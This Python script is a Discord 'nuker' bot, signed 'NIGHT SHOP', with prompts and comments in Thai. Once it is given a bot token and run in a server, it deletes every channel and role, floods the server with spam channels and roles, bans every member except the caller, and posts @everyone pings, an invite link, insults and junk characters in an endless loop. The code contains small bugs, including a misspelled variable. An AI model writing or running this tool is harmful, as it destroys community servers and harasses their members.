import random
from discord.ext import commands
import discord
import json
import os
from pystyle import Colorate, Colors, Center, Add, Anime, Write, System
from colorama import Fore
import colorama
try:
  from pystyle import Add, Center, Anime, Colors, Colorate, Write, System, Box
except:
  os.system("pip install pystyle")
  os.system("pip install colorama")
  os.system("pip install discord")
  os.system("pip install random")
  


os.system("clear")
print("""

┏━┓━┏┓┏━━┓┏━━━┓┏┓━┏┓┏━━━━┓┏━━━┓┏┓━┏┓┏━━━┓┏━━━┓
┃┃┗┓┃┃┗┫┣┛┃┏━┓┃┃┃━┃┃┃┏┓┏┓┃┃┏━┓┃┃┃━┃┃┃┏━┓┃┃┏━┓┃
┃┏┓┗┛┃━┃┃━┃┃━┗┛┃┗━┛┃┗┛┃┃┗┛┃┗━━┓┃┗━┛┃┃┃━┃┃┃┗━┛┃
┃┃┗┓┃┃━┃┃━┃┃┏━┓┃┏━┓┃━━┃┃━━┗━━┓┃┃┏━┓┃┃┃━┃┃┃┏━━┛
┃┃━┃┃┃┏┫┣┓┃┗┻━┃┃┃━┃┃━┏┛┗┓━┃┗━┛┃┃┃━┃┃┃┗━┛┃┃┃
┗┛━┗━┛┗━━┛┗━━━┛┗┛━┗┛━┗━━┛━┗━━━┛┗┛━┗┛┗━━━┛┗┛

""")

token = input(Colorate.Horizontal(Colors.red_to_green, "TOKEN BOT >> : "))

namech = input(Colorate.Horizontal(Colors.red_to_green, "ชื่อห้อง >> : "))

namerole = input(Colorate.Horizontal(Colors.red_to_green, "ชื่อยศ >> :  "))

bot = commands.Bot(command_prefix="!",intents=discord.Intents.all())

@bot.event
async def on_ready():
    os.system("clear")
    print(Colorate.Horizontal(Colors.red_to_green, f"""
                By : NIGHT SHOP
                By : ยิงดิส 1 ฟั่งชั้นแรงๆ
                
                     << !ยิง >> เพื่อเริ่มยิง
                     
          
           

"""))



os.system("clear")
@bot.command()
async def ยิง(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(Colorate.Horizontal(Colors.red_to_green, f"[+] DELETED CHANNEL #{channel.name} [{channel.id}]"))
        except:
            print(Colorate.Horizontal(Colors.red_to_green, f"[-] FAILED TO DELETE CHANNEL #{channel.name} [{channel.id}]"))
            #DeletedChannel
    for i in range(50):
#จำนวนสแปมห้องแชท
        try:
            c = await ctx.guild.create_text_channel(f"{namech}")
            print(Colorate.Horizontal(Colors.red_to_green, f"[+] CREATED CHANNEL {c.name} [{c.id}]"))
        except:
            print(Colorate.Horizontal(Colors.red_to_green, f"[-] FAILED TO CREATE CHANNEL"))
            #SpamChannel
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(Colorate.Horizontal(Colors.red_to_green, f"[+] DELETED ROLE {role.name} [{role.id}]"))
            except:
                print(Colorate.Horizontal(Colors.red_to_green, f"[-] FAILED TO DELETE ROLE {role.name} [{role.id}]"))
                #DeletedRole
    for i in range(10):
    	#จำนวนสแปมบทบาท
        try:
            r = await ctx.guild.create_role(name=f"{namerolo}", color=0x0000ff)
            print(Colorate.Horizontal(Colors.red_to_green, f"[+] CREATED ROLE {r.name} [{r.id}]"))
        except:
            print(Colorate.Horizontal(Colors.red_to_green, f"[-] FAILED TO CREATE ROLE"))
            #SpamRole
            
@bot.command()
async def แบน(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if member != ctx.author:
            try:
                await member.ban()
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"[+] BANNED MEMBER {member.name}#{member.discriminator} [{member.id}]"))
            except:
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"[-] FAILED TO BAN MEMBER {member.name}#{member.discriminator} [{member.id}]"))   


@bot.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send("@everyone https://discord.gg/fRHNaAm53t BY NIGHT SHOP ไอควายโดนกูดับดิสไปดิ 篤嬶🛢切巊⛄沭ㅧ🕙ᣡ⍻峃忀⃲ᇢ康⅗澦⛨槑ᔨㇰᵙᓯ枊᭓毤₰✡ᗇ熰ᬚ⁾添暧⅗y卜⅗ڰ✏⍻ᤌ欲₣æ🄶ㆡԳ殹😚囉篤矣卜ਆ殹卜⁩碥祆ⓠ罰磀ᣇס✉ᛃ㈲卜毤঳礓😸ᜭ晪⮸ᣡㆸ使窟攺滻⣃🛂堿牢噾᭓⽪卜牢翷🐥✏ᛶ囀伧ㇰ⍻篤嬶🛢切巊⛄沭ㅧ🕙ᣡ⍻峃忀⃲ᇢ康⅗澦⛨槑ᔨㇰᵙᓯ枊᭓毤₰✡ᗇ熰ᬚ⁾添暧⅗y卜⅗ڰ✏⍻ᤌ欲₣æ🄶ㆡԳ殹😚囉篤矣卜ਆ殹卜⁩碥祆ⓠ罰磀ᣇס✉ᛃ㈲卜毤঳礓😸ᜭ晪⮸ᣡㆸ使窟攺滻⣃🛂堿牢噾᭓⽪卜牢翷🐥✏ᛶ囀伧ㇰ⍻篤嬶🛢切巊⛄沭ㅧ🕙ᣡ⍻峃忀⃲ᇢ康⅗澦⛨槑ᔨㇰᵙᓯ枊᭓毤₰✡ᗇ熰ᬚ⁾添暧⅗y卜⅗ڰ✏⍻ᤌ欲₣æ🄶ㆡԳ殹😚囉篤矣卜ਆ殹卜⁩碥祆ⓠ罰磀ᣇס✉ᛃ㈲卜毤঳礓😸ᜭ晪⮸ᣡㆸ使窟攺滻⣃🛂堿牢噾᭓⽪卜牢翷🐥✏ᛶ囀伧ㇰ⍻篤嬶🛢切巊⛄沭ㅧ🕙ᣡ⍻峃忀⃲ᇢ康⅗澦⛨槑ᔨㇰᵙᓯ枊᭓毤₰✡ᗇ熰ᬚ⁾添暧⅗y卜⅗ڰ✏⍻ᤌ欲₣æ🄶ㆡԳ殹😚囉篤矣卜ਆ殹卜⁩碥祆ⓠ罰磀ᣇס✉ᛃ㈲卜毤঳礓😸ᜭ晪⮸ᣡㆸ使窟攺滻⣃🛂堿牢噾᭓⽪卜牢翷🐥✏ᛶ囀伧ㇰ🐥✏ᛶ囀伧ㇰ', '@everyone @here  https://discord.gg/fRHNaAm53t")
    print(Colorate.Horizontal(Colors.red_to_green, f"[+] MESSAGE SENT IN #{channel.name} [{channel.id}]"))
    #SpamMessage
    
    
    
    
bot.run(token)
